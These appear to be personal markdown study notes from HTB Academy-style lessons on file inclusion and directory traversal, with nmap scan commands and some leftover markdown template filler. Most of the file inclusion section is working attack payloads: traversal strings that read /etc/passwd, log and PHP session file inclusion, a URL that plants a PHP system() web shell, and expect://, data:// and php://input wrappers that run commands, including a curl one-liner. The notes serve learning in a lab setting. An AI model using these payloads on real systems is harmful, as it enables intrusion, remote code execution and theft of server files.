# Hacking Lessons
Lessons and Tutorials Covered
*
* Directory Traversal (HTB Academy)> File Inclusion / Directory Traversal
* Nmap
*




##### Connect to VPN
> sudo openvpn user.ovpn





### File Inclusion / Directory Traversal (HTB Academy)
Often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en; then the website will grab files from the /en/ directory.

* RCE through PHP Session Files
Default page url with php and access to logs
> http://46.101.91.21:32430/index.php?language=/var/log/apache2/access.log
May need to put the following before the filename 
../../../../../../../../../
/../../../../../
....//....//....//....//....//....//....//....//
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd


* Cookie retrival and Poison
Get cookie from browser inspector. Then look the cookie up via browser url
> http://46.101.91.21:32430/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage
Poison the Cookie 
> http://46.101.91.21:32430/index.php?language=session_poisoning

* Prime the website for code injection
> http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>

* Inject code where id is. Ie cmd=ifconfig
> http://46.101.91.21:32484/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage&cmd=id

 * Other ways to execude remote code - There is 3
   * Execute code where id is (1)
   > http://46.101.91.21:32484/index.php?language=expect://id
   * Get the base64 digit (2)
   > http://46.101.91.21:32484/index.php?language=expect://echo '<?php system($_GET['cmd']); ?>' | base64
   * Execute command (2)
   > http://46.101.91.21:32484/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
   * Execute code via curl, code goes where id is (3)
   > curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid






### Nmap
nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
nmap -sS -sC -sV -Pn -p- -T4 -A host ip
nmap -sV --script=smb* host ip


* list
  * list

1. list 
2. list 

> Blockquote
> 
`<addr>` inline clode

```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```


- [x] this is a complete item
- [ ] this is an incomplete item
